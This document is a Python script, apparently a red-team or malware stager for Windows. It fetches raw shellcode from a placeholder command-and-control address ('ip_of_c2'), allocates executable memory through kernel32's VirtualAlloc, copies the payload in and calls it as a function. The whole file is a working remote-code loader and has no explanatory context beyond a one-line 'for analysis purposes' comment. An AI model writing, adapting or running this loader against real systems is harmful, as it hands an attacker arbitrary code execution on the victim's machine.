from urllib import request
import base64
import ctypes

MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x40

# Load kernel32 DLL
kernel32 = ctypes.windll.kernel32

def get_code(url):
    """Download shellcode from a given URL."""
    with request.urlopen(url) as response:
        shellcode = response.read()
    return shellcode

def write_memory(buf):
    """Allocate memory and write the buffer to it."""
   
    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    kernel32.VirtualAlloc.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong]
    kernel32.RtlMoveMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t]
    
    buf_size = len(buf)
    
    # Allocate memory
    ptr = kernel32.VirtualAlloc(None, buf_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if not ptr:
        raise MemoryError("Failed to allocate memory")

    # Write the buffer into allocated memory
    kernel32.RtlMoveMemory(ptr, ctypes.addressof(buf), buf_size)

    return ptr

def run(shellcode):
    """Create a buffer, write it to memory, and execute it."""
    buffer = ctypes.create_string_buffer(shellcode)
    ptr = write_memory(buffer)
    shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
    shell_func()

if __name__ == '__main__':
    url = "http://ip_of_c2/shellcode.bin"
    shellcode = get_code(url)
    if shellcode is None or not shellcode:
        raise ValueError("Shellcode is empty or invalid")
    run(shellcode)
    # For analysis purposes
    input("Press Enter to exit...")

